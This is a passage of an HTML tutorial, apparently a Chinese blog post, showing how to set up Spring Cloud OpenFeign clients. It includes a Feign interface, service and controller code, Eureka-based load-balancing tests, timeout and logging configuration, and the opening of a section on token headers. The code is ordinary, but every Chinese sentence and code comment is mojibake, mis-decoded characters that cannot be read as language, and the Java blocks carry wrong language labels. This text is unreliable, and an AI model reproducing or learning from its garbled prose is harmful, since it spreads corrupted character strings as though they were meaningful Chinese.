<p>æ¥ä¸‹æ¥ï¼Œåœ¨ ServiceB çš„ Spring Boot ä¸»ç±»ä¸Šæ·»åŠ @EnableFeignClientsæ³¨è§£ï¼Œè¿™ä¸ªæ³¨è§£çš„ä½œç”¨è‡³å…³é‡è¦ï¼Œå®ƒå°±åƒæ˜¯ä¸€ä¸ª â€œå¼€å…³â€ï¼Œå¼€å¯äº† Spring å¯¹ Feign å®¢æˆ·ç«¯çš„æ‰«æåŠŸèƒ½ã€‚å½“ Spring å®¹å™¨å¯åŠ¨æ—¶ï¼Œä¼šæ‰«ææ‰€æœ‰æ ‡æ³¨äº†@FeignClientæ³¨è§£çš„æ¥å£ï¼ˆè¿™æ˜¯ä¸‹ä¸€æ­¥è¦åšçš„ï¼‰ï¼Œå¹¶ä¸ºè¿™äº›æ¥å£ç”Ÿæˆä»£ç†å¯¹è±¡ï¼Œè¿™äº›ä»£ç†å¯¹è±¡å°†è´Ÿè´£å®é™…çš„è¿œç¨‹è°ƒç”¨æ“ä½œã€‚ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> org.<span class="hljs-property">springframework</span>.<span class="hljs-property">boot</span>.<span class="hljs-property">SpringApplication</span>;
<span class="hljs-keyword">import</span> org.<span class="hljs-property">springframework</span>.<span class="hljs-property">boot</span>.<span class="hljs-property">autoconfigure</span>.<span class="hljs-property">SpringBootApplication</span>;
<span class="hljs-keyword">import</span> org.<span class="hljs-property">springframework</span>.<span class="hljs-property">cloud</span>.<span class="hljs-property">openfeign</span>.<span class="hljs-property">EnableFeignClients</span>;

<span class="hljs-meta">@SpringBootApplication</span>
<span class="hljs-meta">@EnableFeignClients</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServiceBApplication</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-built_in">String</span>[] args</span>) {
        <span class="hljs-title class_">SpringApplication</span>.<span class="hljs-title function_">run</span>(<span class="hljs-title class_">ServiceBApplication</span>.<span class="hljs-property">class</span>, args);
    }
}
</code></pre>
<p>é€šè¿‡è¿™ä¸€æ­¥ï¼ŒServiceB å·²ç»åšå¥½äº†ä½¿ç”¨ Feign çš„å‰æœŸå‡†å¤‡ï¼Œä¸ºåç»­çš„è¿œç¨‹è°ƒç”¨æ¥å£å®šä¹‰å’Œå®ç°å¥ å®šäº†åŸºç¡€ã€‚</p>
<h3 data-id="heading-15"><strong>3.2.2 æ­¥éª¤ 2ï¼šç¼–å†™ Feign å®¢æˆ·ç«¯æ¥å£</strong></h3>
<p>åœ¨ ServiceB ä¸­åˆ›å»ºä¸€ä¸ª Feign å®¢æˆ·ç«¯æ¥å£ï¼Œè¿™ä¸ªæ¥å£å°†å®šä¹‰æˆ‘ä»¬å¦‚ä½•ä¸ ServiceA è¿›è¡Œäº¤äº’ã€‚ä»¥è°ƒç”¨ ServiceA çš„/user/{id}æ¥å£è·å–ç”¨æˆ·ä¿¡æ¯ä¸ºä¾‹ï¼Œåˆ›å»ºUserFeignClientæ¥å£ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> org.springframework.cloud.openfeign.FeignClient;
<span class="hljs-keyword">import</span> org.springframework.web.bind.<span class="hljs-keyword">annotation</span>.GetMapping;
<span class="hljs-keyword">import</span> org.springframework.web.bind.<span class="hljs-keyword">annotation</span>.PathVariable;

<span class="hljs-meta">@FeignClient(name = <span class="hljs-string">"serviceA"</span>)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserFeignClient</span> {
    <span class="hljs-meta">@GetMapping(<span class="hljs-string">"/user/{id}"</span>)</span>
    User getUserById(<span class="hljs-meta">@PathVariable</span> <span class="hljs-built_in">Long</span> id);
}
</code></pre>
<p>åœ¨è¿™ä¸ªæ¥å£ä¸­ï¼Œ@FeignClient(name = "serviceA")æ³¨è§£æŒ‡å®šäº†è¦è°ƒç”¨çš„æœåŠ¡åæ˜¯serviceAï¼Œè¿™ä¸ªæœåŠ¡åå¿…é¡»ä¸ ServiceA åœ¨ Eureka ä¸­æ³¨å†Œçš„æœåŠ¡åä¸€è‡´ï¼Œè¿™æ · Feign æ‰èƒ½å‡†ç¡®åœ°æ‰¾åˆ°ç›®æ ‡æœåŠ¡ã€‚getUserByIdæ–¹æ³•ä¸Šçš„@GetMapping("/user/{id}")æ³¨è§£ä¸ ServiceA ä¸­UserControllerçš„getUserByIdæ–¹æ³•çš„æ³¨è§£ä¿æŒä¸€è‡´ï¼Œå®šä¹‰äº†è¯·æ±‚çš„è·¯å¾„å’Œæ–¹æ³•ã€‚@PathVariable Long idè¡¨ç¤ºæ–¹æ³•çš„å‚æ•°ï¼Œä¼šä½œä¸ºè·¯å¾„å˜é‡ä¼ é€’åˆ°è¯·æ±‚ä¸­ã€‚</p>
<p>é€šè¿‡è¿™ä¸ªæ¥å£çš„å®šä¹‰ï¼Œæˆ‘ä»¬æ¸…æ™°åœ°æè¿°äº†å¯¹ ServiceA çš„è¿œç¨‹è°ƒç”¨éœ€æ±‚ï¼Œå°±åƒæ˜¯åˆ¶å®šäº†ä¸€ä»½è¯¦ç»†çš„ â€œä½œæˆ˜è®¡åˆ’â€ï¼Œå‘Šè¯‰ Feign è¦è°ƒç”¨å“ªä¸ªæœåŠ¡çš„å“ªä¸ªæ¥å£ï¼Œä»¥åŠä¼ é€’ä»€ä¹ˆå‚æ•°ã€‚</p>
<h3 data-id="heading-16"><strong>3.2.3 æ­¥éª¤ 3ï¼šä¸šåŠ¡å±‚æ³¨å…¥å¹¶è°ƒç”¨</strong></h3>
<p>åœ¨ ServiceB çš„ä¸šåŠ¡å±‚ï¼ˆä¾‹å¦‚OrderServiceç±»ï¼‰ä¸­ï¼Œé€šè¿‡@Autowiredæ³¨è§£æ³¨å…¥UserFeignClientæ¥å£ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">import org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.beans</span><span class="hljs-selector-class">.factory</span><span class="hljs-selector-class">.annotation</span><span class="hljs-selector-class">.Autowired</span>;
import org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.stereotype</span><span class="hljs-selector-class">.Service</span>;

<span class="hljs-keyword">@Service</span>
public class OrderService {

    <span class="hljs-keyword">@Autowired</span>
    private UserFeignClient userFeignClient;

    public <span class="hljs-attribute">Order</span> <span class="hljs-built_in">createOrder</span>(Long userId) {
        <span class="hljs-comment">// é€šè¿‡Feignè°ƒç”¨ServiceAè·å–ç”¨æˆ·ä¿¡æ¯</span>
        User user = userFeignClient<span class="hljs-selector-class">.getUserById</span>(userId);
        
        <span class="hljs-comment">// æ¨¡æ‹Ÿåˆ›å»ºè®¢å•é€»è¾‘</span>
        <span class="hljs-attribute">Order</span> <span class="hljs-attribute">order</span> = new <span class="hljs-attribute">Order</span>();
        <span class="hljs-attribute">order</span><span class="hljs-selector-class">.setUserId</span>(userId);
        <span class="hljs-attribute">order</span><span class="hljs-selector-class">.setUserName</span>(user.getName());
        <span class="hljs-attribute">order</span><span class="hljs-selector-class">.setOrderStatus</span>("å·²åˆ›å»º");
        
        return <span class="hljs-attribute">order</span>;
    }
}
</code></pre>
<p>åœ¨createOrderæ–¹æ³•ä¸­ï¼Œæˆ‘ä»¬ç›´æ¥è°ƒç”¨userFeignClient.getUserById(userId)æ–¹æ³•ï¼Œå°±åƒè°ƒç”¨æœ¬åœ°æ–¹æ³•ä¸€æ ·ç®€å•ã€‚Feign ä¼šåœ¨èƒŒåè‡ªåŠ¨æ ¹æ®æˆ‘ä»¬å®šä¹‰çš„æ¥å£å’Œæ³¨è§£ï¼Œç”Ÿæˆ HTTP è¯·æ±‚å¹¶å‘é€åˆ° ServiceAï¼Œè·å–ç”¨æˆ·ä¿¡æ¯åè¿”å›ç»™userå˜é‡ã€‚ç„¶åæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªç”¨æˆ·ä¿¡æ¯è¿›è¡Œåç»­çš„ä¸šåŠ¡æ“ä½œï¼Œæ¯”å¦‚åˆ›å»ºè®¢å•ï¼Œå¹¶å°†ç”¨æˆ·ç›¸å…³ä¿¡æ¯å¡«å……åˆ°è®¢å•å¯¹è±¡ä¸­ã€‚</p>
<p>æœ€åï¼Œåœ¨ Controller å±‚ä¸­æš´éœ²æ¥å£ï¼Œè®©å¤–éƒ¨å¯ä»¥è®¿é—®è¿™ä¸ªä¸šåŠ¡æ–¹æ³•ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> org.springframework.beans.factory.<span class="hljs-keyword">annotation</span>.Autowired;
<span class="hljs-keyword">import</span> org.springframework.web.bind.<span class="hljs-keyword">annotation</span>.GetMapping;
<span class="hljs-keyword">import</span> org.springframework.web.bind.<span class="hljs-keyword">annotation</span>.PathVariable;
<span class="hljs-keyword">import</span> org.springframework.web.bind.<span class="hljs-keyword">annotation</span>.RestController;

<span class="hljs-meta">@RestController</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderController</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderService orderService;

    <span class="hljs-meta">@GetMapping(<span class="hljs-string">"/order/{userId}"</span>)</span>
    <span class="hljs-keyword">public</span> Order createOrder(<span class="hljs-meta">@PathVariable</span> <span class="hljs-built_in">Long</span> userId) {
        <span class="hljs-keyword">return</span> orderService.createOrder(userId);
    }
}
</code></pre>
<p>é€šè¿‡è¿™ä¸‰æ­¥ï¼Œæˆ‘ä»¬æˆåŠŸåœ°åœ¨ ServiceB ä¸­ä½¿ç”¨ Feign å®ç°äº†å¯¹ ServiceA çš„è¿œç¨‹è°ƒç”¨ï¼Œä»æ¥å£å®šä¹‰åˆ°ä¸šåŠ¡å±‚è°ƒç”¨ï¼Œæ•´ä¸ªè¿‡ç¨‹ç®€æ´æ˜äº†ï¼Œå……åˆ†ä½“ç°äº† Feign çš„å¼ºå¤§å’Œä¾¿æ·ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fa4d9c0d5a8d4369b51f182f972c4ef5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We5aWH5bCP5rGk5ZyG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771228108&amp;x-signature=IThMP%2B3mltTZi8mnKedxZNZWRZU%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-17"><strong>3.3 æµ‹è¯•éªŒè¯ï¼šå¯åŠ¨æœåŠ¡å¹¶éªŒè¯è°ƒç”¨æ•ˆæœ</strong></h3>
<p>åœ¨å®Œæˆä¸Šè¿°ä»£ç ç¼–å†™åï¼Œæˆ‘ä»¬éœ€è¦å¯åŠ¨å„ä¸ªæœåŠ¡å¹¶è¿›è¡Œæµ‹è¯•ï¼Œä»¥éªŒè¯ Feign è°ƒç”¨æ˜¯å¦æ­£å¸¸å·¥ä½œã€‚</p>
<p>é¦–å…ˆï¼ŒæŒ‰ç…§ â€œæ³¨å†Œä¸­å¿ƒâ†’ServiceAâ†’ServiceBâ€ çš„é¡ºåºå¯åŠ¨æœåŠ¡ã€‚å…ˆå¯åŠ¨ Eureka Serverï¼Œç¡®ä¿æœåŠ¡æ³¨å†Œä¸­å¿ƒæ­£å¸¸è¿è¡Œï¼›ç„¶åå¯åŠ¨ ServiceAï¼Œå°†å…¶æ³¨å†Œåˆ° Eureka Server ä¸Šï¼›æœ€åå¯åŠ¨ ServiceBï¼ŒServiceB ä¼šä» Eureka Server è·å– ServiceA çš„åœ°å€ä¿¡æ¯ï¼Œå¹¶å‡†å¤‡å¥½é€šè¿‡ Feign è¿›è¡Œè¿œç¨‹è°ƒç”¨ã€‚</p>
<p>å¯åŠ¨å®Œæˆåï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æµè§ˆå™¨æˆ– Postman ç­‰å·¥å…·è®¿é—® ServiceB çš„è®¢å•æ¥å£ï¼Œä¾‹å¦‚è®¿é—®<a href="https://link.juejin.cn?target=https%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttp%253A%2F%2Flocalhost%2F" target="_blank" title="https://link.zhihu.com/?target=http%3A//localhost/" ref="nofollow noopener noreferrer">http://localhost:</a>æœåŠ¡Bç«¯å£/order/1ï¼ˆå‡è®¾ ServiceB çš„ç«¯å£ä¸º 8082ï¼Œ1æ˜¯ç”¨æˆ· IDï¼‰ã€‚å¦‚æœä¸€åˆ‡æ­£å¸¸ï¼Œæˆ‘ä»¬åº”è¯¥èƒ½å¤Ÿçœ‹åˆ°è¿”å›çš„è®¢å•ä¿¡æ¯ï¼Œå…¶ä¸­åŒ…å«ä» ServiceA è·å–çš„ç”¨æˆ·ä¿¡æ¯ï¼Œä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"userId"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"userName"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"å¼ ä¸‰"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"orderStatus"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"å·²åˆ›å»º"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>è¿™è¡¨æ˜ ServiceB æˆåŠŸåœ°é€šè¿‡ Feign è°ƒç”¨äº† ServiceA çš„/user/{id}æ¥å£ï¼Œå¹¶è·å–åˆ°äº†ç”¨æˆ·ä¿¡æ¯ï¼Œç„¶åå°†å…¶ç”¨äºåˆ›å»ºè®¢å•å¹¶è¿”å›ç»“æœã€‚</p>
<p>ä¸ºäº†è¿›ä¸€æ­¥éªŒè¯ Feign çš„è´Ÿè½½å‡è¡¡æ•ˆæœï¼Œæˆ‘ä»¬å¯ä»¥å¤šå¯åŠ¨ä¸€ä¸ª ServiceA å®ä¾‹ï¼Œæ¯”å¦‚å°† ServiceA çš„ç«¯å£æ”¹ä¸º 8083ï¼Œé‡æ–°æ‰“åŒ…å¹¶å¯åŠ¨ã€‚æ­¤æ—¶ï¼ŒEureka Server ä¸­ä¼šæ³¨å†Œä¸¤ä¸ª ServiceA çš„å®ä¾‹ã€‚å†æ¬¡è®¿é—® ServiceB çš„è®¢å•æ¥å£ï¼Œå¤šæ¬¡åˆ·æ–°åä¼šå‘ç°ï¼Œè¯·æ±‚ä¼šè½®æµå‘é€åˆ°ä¸¤ä¸ª ServiceA å®ä¾‹ä¸Šï¼Œè¿™å°±æ˜¯ Feign ç»“åˆ Ribbon å®ç°çš„å®¢æˆ·ç«¯è´Ÿè½½å‡è¡¡åŠŸèƒ½ï¼Œå®ƒç¡®ä¿äº†è¯·æ±‚èƒ½å¤Ÿå‡åŒ€åœ°åˆ†é…åˆ°å„ä¸ªæœåŠ¡å®ä¾‹ä¸Šï¼Œæé«˜äº†ç³»ç»Ÿçš„å¯ç”¨æ€§å’Œæ€§èƒ½ã€‚é€šè¿‡è¿™æ ·çš„æµ‹è¯•éªŒè¯ï¼Œæˆ‘ä»¬å¯ä»¥ç¡®è®¤ Feign åœ¨æˆ‘ä»¬çš„é¡¹ç›®ä¸­å·²ç»æˆåŠŸåœ°å®ç°äº†è¿œç¨‹è°ƒç”¨å’Œè´Ÿè½½å‡è¡¡åŠŸèƒ½ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6f3fd8da78a34fc491c39fd5212c4c94~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We5aWH5bCP5rGk5ZyG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771228108&amp;x-signature=VF51sXHiOv4CchrjQyLm7d8Pj0s%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-18"><strong>å››ã€é«˜çº§ç‰¹æ€§ï¼šè§£é” Feign çš„ â€œéšè—ç©æ³•â€</strong></h2>
<h3 data-id="heading-19"><strong>4.1 è‡ªå®šä¹‰é…ç½®ï¼šè¶…æ—¶ã€æ—¥å¿—å…¨æŒæ§</strong></h3>
<p>åœ¨å®é™…çš„ Spring é¡¹ç›®å¼€å‘ä¸­ï¼ŒFeign çš„é»˜è®¤é…ç½®å¾€å¾€æ— æ³•æ»¡è¶³å¤æ‚å¤šå˜çš„ä¸šåŠ¡éœ€æ±‚ã€‚è¿™æ—¶å€™ï¼ŒFeign å¼ºå¤§çš„è‡ªå®šä¹‰é…ç½®åŠŸèƒ½å°±æ´¾ä¸Šç”¨åœºäº†ï¼Œå®ƒå…è®¸æˆ‘ä»¬æ ¹æ®å…·ä½“åœºæ™¯ï¼Œçµæ´»è°ƒæ•´è¶…æ—¶æ—¶é—´å’Œæ—¥å¿—çº§åˆ«ï¼Œè®© Feign çš„è¿è¡Œæ›´åŠ è´´åˆé¡¹ç›®å®é™…æƒ…å†µã€‚</p>
<h3 data-id="heading-20"><strong>4.1.1 è¶…æ—¶é…ç½®ï¼šè§£å†³é»˜è®¤è¶…æ—¶è¿‡çŸ­çš„é—®é¢˜</strong></h3>
<p>Feign é»˜è®¤çš„è¿æ¥è¶…æ—¶æ—¶é—´ä¸º 1 ç§’ï¼Œè¯»å–è¶…æ—¶æ—¶é—´ä¸º 10 ç§’ã€‚åœ¨ç½‘ç»œç¯å¢ƒè‰¯å¥½ã€æœåŠ¡å“åº”è¿…é€Ÿçš„ç†æƒ³æƒ…å†µä¸‹ï¼Œè¿™äº›é»˜è®¤å€¼æˆ–è®¸èƒ½å¤Ÿæ­£å¸¸å·¥ä½œã€‚ä½†åœ¨ç°å®çš„ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œå°¤å…¶æ˜¯æ¶‰åŠåˆ°é«˜å»¶è¿Ÿç½‘ç»œã€å¤æ‚ä¸šåŠ¡é€»è¾‘å¯¼è‡´çš„æœåŠ¡å“åº”ç¼“æ…¢ç­‰åœºæ™¯æ—¶ï¼Œè¿™äº›é»˜è®¤çš„è¶…æ—¶æ—¶é—´å°±æ˜¾å¾—æ‰è¥Ÿè§è‚˜äº†ã€‚</p>
<p>æƒ³è±¡ä¸€ä¸‹ï¼Œä½ çš„åº”ç”¨ç¨‹åºéœ€è¦è°ƒç”¨ä¸€ä¸ªä½äºè¿œç¨‹æ•°æ®ä¸­å¿ƒçš„å¾®æœåŠ¡ï¼Œç”±äºç½‘ç»œè·ç¦»è¾ƒè¿œï¼Œå­˜åœ¨ä¸€å®šçš„å»¶è¿Ÿã€‚æˆ–è€…ï¼Œè¢«è°ƒç”¨çš„å¾®æœåŠ¡éœ€è¦å¤„ç†å¤§é‡çš„æ•°æ®è®¡ç®—ï¼Œå“åº”æ—¶é—´è¾ƒé•¿ã€‚åœ¨è¿™äº›æƒ…å†µä¸‹ï¼ŒFeign çš„é»˜è®¤è¶…æ—¶æ—¶é—´å¾ˆå¯èƒ½å¯¼è‡´è°ƒç”¨åœ¨æœåŠ¡è¿˜æœªå“åº”ä¹‹å‰å°±è§¦å‘è¶…æ—¶å¼‚å¸¸ï¼Œä½¿å¾—ä¸šåŠ¡æ— æ³•æ­£å¸¸è¿›è¡Œã€‚</p>
<p>ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡é…ç½®æ–‡ä»¶æ¥è°ƒæ•´ Feign çš„è¶…æ—¶æ—¶é—´ã€‚åœ¨application.ymlæ–‡ä»¶ä¸­ï¼Œæ·»åŠ å¦‚ä¸‹é…ç½®ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">feign:</span>
  <span class="hljs-attr">client:</span>
    <span class="hljs-attr">config:</span>
      <span class="hljs-attr">default:</span>
        <span class="hljs-attr">connectTimeout:</span> <span class="hljs-number">5000</span> <span class="hljs-comment"># è¿æ¥è¶…æ—¶æ—¶é—´è®¾ç½®ä¸º5000æ¯«ç§’</span>
        <span class="hljs-attr">readTimeout:</span> <span class="hljs-number">5000</span>    <span class="hljs-comment"># è¯»å–è¶…æ—¶æ—¶é—´è®¾ç½®ä¸º5000æ¯«ç§’</span>
</code></pre>
<p>åœ¨ä¸Šè¿°é…ç½®ä¸­ï¼Œfeign.client.config.defaultè¡¨ç¤ºè¿™æ˜¯é’ˆå¯¹æ‰€æœ‰ Feign å®¢æˆ·ç«¯çš„å…¨å±€é»˜è®¤é…ç½®ã€‚connectTimeoutè®¾ç½®äº†å»ºç«‹ TCP è¿æ¥çš„æœ€å¤§ç­‰å¾…æ—¶é—´ä¸º 5000 æ¯«ç§’ï¼ŒreadTimeoutè®¾ç½®äº†ä»è¿æ¥ä¸­è¯»å–æ•°æ®çš„æœ€é•¿ç­‰å¾…æ—¶é—´ä¸º 5000 æ¯«ç§’ã€‚é€šè¿‡è¿™æ ·çš„é…ç½®ï¼ŒFeign åœ¨å‘èµ·è¿œç¨‹è°ƒç”¨æ—¶ï¼Œä¼šæœ‰æ›´å……è¶³çš„æ—¶é—´æ¥å»ºç«‹è¿æ¥å’Œè¯»å–å“åº”æ•°æ®ï¼Œä»è€Œé¿å…å› è¶…æ—¶å¯¼è‡´çš„è°ƒç”¨å¤±è´¥ï¼Œæé«˜ç³»ç»Ÿçš„ç¨³å®šæ€§å’Œå¯é æ€§ã€‚</p>
<h3 data-id="heading-21"><strong>4.1.2 æ—¥å¿—é…ç½®ï¼šè°ƒè¯• HTTP è¯·æ±‚çš„ â€œåˆ©å™¨â€</strong></h3>
<p>åœ¨å¼€å‘å’Œè°ƒè¯•é˜¶æ®µï¼Œäº†è§£ Feign å®é™…å‘é€å’Œæ¥æ”¶çš„ HTTP è¯·æ±‚åŠå“åº”å†…å®¹æ˜¯éå¸¸é‡è¦çš„ï¼Œè¿™æœ‰åŠ©äºæˆ‘ä»¬å¿«é€Ÿå®šä½å’Œè§£å†³é—®é¢˜ã€‚Feign æä¾›äº†çµæ´»çš„æ—¥å¿—é…ç½®åŠŸèƒ½ï¼Œè®©æˆ‘ä»¬å¯ä»¥è½»æ¾æŒæ§æ—¥å¿—çš„è¾“å‡ºçº§åˆ«å’Œå†…å®¹ã€‚</p>
<p>é¦–å…ˆï¼Œåœ¨application.ymlæ–‡ä»¶ä¸­è®¾ç½® Feign å®¢æˆ·ç«¯æ¥å£æ‰€åœ¨åŒ…çš„æ—¥å¿—çº§åˆ«ä¸ºDEBUGï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">logging:</span>
  <span class="hljs-attr">level:</span>
    <span class="hljs-attr">com.example.feignclientpackage:</span> <span class="hljs-string">DEBUG</span> <span class="hljs-comment"># å°†Feignå®¢æˆ·ç«¯æ¥å£æ‰€åœ¨åŒ…çš„æ—¥å¿—çº§åˆ«è®¾ç½®ä¸ºDEBUG</span>
</code></pre>
<p>é€šè¿‡è¿™ä¸€æ­¥é…ç½®ï¼ŒFeign ä¼šè¾“å‡ºæ›´è¯¦ç»†çš„æ—¥å¿—ä¿¡æ¯ï¼Œä½†æ­¤æ—¶æ—¥å¿—å†…å®¹è¿˜ä¸å¤Ÿå®Œæ•´ã€‚ä¸ºäº†è®© Feign è¾“å‡ºå®Œæ•´çš„è¯·æ±‚å¤´ã€è¯·æ±‚ä½“ã€å“åº”å¤´å’Œå“åº”ä½“ä¿¡æ¯ï¼Œæˆ‘ä»¬è¿˜éœ€è¦åœ¨é…ç½®ç±»ä¸­è¿›è¡Œè¿›ä¸€æ­¥è®¾ç½®ã€‚åˆ›å»ºä¸€ä¸ªé…ç½®ç±»ï¼Œä¾‹å¦‚FeignConfig.javaï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> feign.Logger;
<span class="hljs-keyword">import</span> org.springframework.context.<span class="hljs-keyword">annotation</span>.Bean;
<span class="hljs-keyword">import</span> org.springframework.context.<span class="hljs-keyword">annotation</span>.Configuration;

<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FeignConfig</span> {
    <span class="hljs-meta">@Bean</span>
    Logger.Level feignLoggerLevel() {
        <span class="hljs-keyword">return</span> Logger.Level.FULL; <span class="hljs-comment">// è®¾ç½®Feignæ—¥å¿—çº§åˆ«ä¸ºFULL</span>
    }
}
</code></pre>
<p>åœ¨ä¸Šè¿°ä»£ç ä¸­ï¼ŒLogger.Level.FULLè¡¨ç¤ºè¾“å‡ºå®Œæ•´çš„æ—¥å¿—ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¯·æ±‚å’Œå“åº”çš„å¤´ä¿¡æ¯ã€æ­£æ–‡å’Œå…ƒæ•°æ®ã€‚è¿™æ ·ï¼Œå½“æˆ‘ä»¬åœ¨é¡¹ç›®ä¸­è¿›è¡Œ Feign è°ƒç”¨æ—¶ï¼Œå°±å¯ä»¥åœ¨æ—¥å¿—ä¸­æ¸…æ™°åœ°çœ‹åˆ°å®Œæ•´çš„ HTTP è¯·æ±‚å’Œå“åº”è¿‡ç¨‹ï¼Œä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-attr">[UserFeignClient#getUser]</span> ---&gt; GET http://user-service/user/<span class="hljs-number">1</span> HTTP/<span class="hljs-number">1.1</span>
Authorization: Bearer xxxxx
Content-Type: application/json
Accept: application/json

{
    "param1": <span class="hljs-string">"value1"</span>,
    <span class="hljs-string">"param2"</span>: <span class="hljs-string">"value2"</span>
}
---&gt; END HTTP (<span class="hljs-number">45</span>-byte <span class="hljs-selector-tag">body</span>)

<span class="hljs-selector-attr">[UserFeignClient#getUser]</span> &lt;--- HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> OK (<span class="hljs-number">345ms</span>)
<span class="hljs-attribute">Content</span>-Type: application/json
Content-Length: <span class="hljs-number">65</span>

{
    "id": <span class="hljs-number">1</span>,
    <span class="hljs-string">"name"</span>: <span class="hljs-string">"å¼ ä¸‰"</span>,
    <span class="hljs-string">"age"</span>: <span class="hljs-number">20</span>
}
&lt;--- END HTTP (<span class="hljs-number">65</span>-byte <span class="hljs-selector-tag">body</span>)
</code></pre>
<p>é€šè¿‡è¿™äº›è¯¦ç»†çš„æ—¥å¿—ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥æ–¹ä¾¿åœ°æ£€æŸ¥è¯·æ±‚å‚æ•°æ˜¯å¦æ­£ç¡®ã€å“åº”å†…å®¹æ˜¯å¦ç¬¦åˆé¢„æœŸï¼Œä»è€Œå¿«é€Ÿæ’æŸ¥å’Œè§£å†³ Feign è°ƒç”¨è¿‡ç¨‹ä¸­å‡ºç°çš„é—®é¢˜ï¼Œæé«˜å¼€å‘å’Œè°ƒè¯•æ•ˆç‡ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a1ee122bea854b88a908fc33f6e50e39~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We5aWH5bCP5rGk5ZyG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771228108&amp;x-signature=H1jyuXJtasNbM23zJHNe80P4x2E%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-22"><strong>4.2 Header ä¼ é€’ï¼šå®ç° Token ç­‰è‡ªå®šä¹‰å¤´ä¿¡æ¯</strong></h3>
<p>åœ¨å¾®æœåŠ¡æ¶æ„ä¸­ï¼ŒæœåŠ¡é—´çš„é€šä¿¡å¾€å¾€éœ€è¦æºå¸¦ä¸€äº›è‡ªå®šä¹‰çš„ Header ä¿¡æ¯ï¼Œæ¯”å¦‚ç”¨äºèº«ä»½éªŒè¯çš„ Tokenã€ç”¨äºé“¾è·¯è¿½è¸ªçš„ TraceId ç­‰ã€‚Feign æä¾›äº†çµæ´»çš„æœºåˆ¶æ¥å®ç° Header çš„ä¼ é€’ï¼Œç¡®ä¿è¿™äº›å…³é”®ä¿¡æ¯èƒ½å¤Ÿåœ¨æœåŠ¡é—´å‡†ç¡®æ— è¯¯åœ°æµè½¬ã€‚</p>
<p>ä»¥å¸¸è§çš„å¾®æœåŠ¡é‰´æƒåœºæ™¯ä¸ºä¾‹ï¼Œå½“ç”¨æˆ·åœ¨å‰ç«¯ç™»å½•æˆåŠŸåï¼Œç³»ç»Ÿä¼šç”Ÿæˆä¸€ä¸ª Tokenï¼Œè¿™ä¸ª Token ä¼šåœ¨åç»­çš„è¯·æ±‚ä¸­ä½œä¸ºèº«ä»½å‡­è¯ï¼Œç”¨äºéªŒè¯ç”¨æˆ·çš„æƒé™ã€‚åœ¨æœåŠ¡é—´è°ƒç”¨æ—¶ï¼Œæˆ‘ä»¬éœ€è¦å°†è¿™ä¸ª Token ä»ä¸€ä¸ªæœåŠ¡ä¼ é€’åˆ°å¦ä¸€ä¸ªæœåŠ¡ï¼Œä»¥ç¡®ä¿æ¯ä¸ªæœåŠ¡éƒ½èƒ½è¯†åˆ«ç”¨æˆ·èº«ä»½å¹¶è¿›è¡Œç›¸åº”çš„æƒé™æ§åˆ¶ã€‚</p>
